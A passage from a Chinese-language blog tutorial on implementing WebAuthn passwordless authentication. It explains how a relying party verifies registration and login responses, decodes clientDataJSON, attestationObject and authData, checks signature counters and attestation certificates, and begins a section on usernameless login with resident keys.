 response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 